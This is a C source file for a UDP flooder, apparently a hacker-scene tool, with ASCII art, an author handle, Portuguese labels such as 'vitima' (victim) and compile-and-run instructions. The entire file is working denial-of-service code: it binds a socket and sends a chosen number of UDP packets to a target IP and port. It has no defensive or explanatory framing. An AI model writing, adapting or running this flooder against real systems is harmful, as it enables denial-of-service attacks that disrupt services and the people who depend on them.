/*
 
            ,;~;,                           
                /\_                                                    
               (  /                               
               (()|     //)                     
               | \\  ,,;;'\             GAME OVER
           __ _(  )m=(((((((((((((================--------
         /'  ' '()/~' '.(, |
      ,;(      )||     |  ~             
     ,;' \    /-(.;,   ))            
          ) / /     ) //   
         //  \\     |||   
        )_\   )_\   )_\\

 by d3lf0

 compiler: gcc -o udp udp_flood.c; ./udp <ip_server> <port>
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>

#define ERRO -1
#define MSG "Ximba"

int main(int argc, char *argv[]) {
 struct sockaddr_in vitima;
 struct sockaddr_in hack;
 int meusocket;
 int porta,num_pac,i,tamanho;
 char *alvo;

 if(argc<4) {
  printf("\n*******************************\n");
  printf("\tUDP Flooder\n");
  printf("*******************************\n");
  exit(0);
 } else {
  printf("\nuse: %s <ip_vitima> <porta_vitima> <num_pacotes>\n",argv[0]);
 }

 alvo = argv[1];
 porta = atoi(argv[2]);
 num_pac = atoi(argv[3]);

 meusocket=socket(AF_INET, SOCK_DGRAM, 17);
 if(meusocket<0){
  perror("\033[36m[-] socket");
  printf("\033[0m");
  exit(1);
 }

 //memset((char *)&servidor,0,sizeof(servidor));
 hack.sin_family = AF_INET;
 hack.sin_port = htons(0);
 hack.sin_addr.s_addr = htonl(INADDR_ANY);
 bzero(&(hack.sin_zero),8);

 //associa uma porta local (sock hacker) na maquina local
 if(bind(meusocket,(struct sockaddr *)&hack,sizeof(hack))<0) {
  perror("\033[36m[-] bind");
  printf("\033[0m");
  exit(0);
 }

 //memset((char *)&cliente,0,sizeof(cliente));
 vitima.sin_family = AF_INET;
 vitima.sin_port = htons(porta);
 vitima.sin_addr.s_addr = inet_addr(alvo);
 bzero(&(vitima.sin_zero),8);

 tamanho = sizeof(struct sockaddr_in);
 for(i=0;i<num_pac;i++) {
  if(sendto(meusocket,MSG,sizeof(MSG),0,(struct sockaddr_in*)&vitima,tamanho)== -1){
   perror("\033[36m[-] sendto");
   printf("\033[0m");
   exit(0);
  }
 }
 puts("pacotes enviados com sucesso!");
 return 0;
}
